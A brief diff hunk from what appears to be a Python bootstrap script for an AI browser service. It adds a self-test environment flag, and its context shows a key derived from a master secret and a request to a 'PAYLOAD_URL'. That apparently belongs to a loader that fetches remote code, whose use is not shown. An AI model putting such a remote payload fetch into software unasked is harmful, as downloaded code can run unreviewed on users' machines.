@@ -33,6 +33,7 @@ os.environ.setdefault("AI_BROWSER_PORTABLE_PROFILES","1")
 os.environ.setdefault("AI_BROWSER_MAX_SESSIONS","1")
 os.environ.setdefault("AI_BROWSER_HOST","0.0.0.0")
 os.environ.setdefault("AI_BROWSER_PORT",os.environ.get("PORT","10000"))
+os.environ.setdefault("AI_BROWSER_ENABLE_SELFTEST","1")
 
 key=derive(master,"app-code")
 req=urllib.request.Request(PAYLOAD_URL,headers={"User-Agent":"AI-Browser-Bootstrap/0.3.3"})
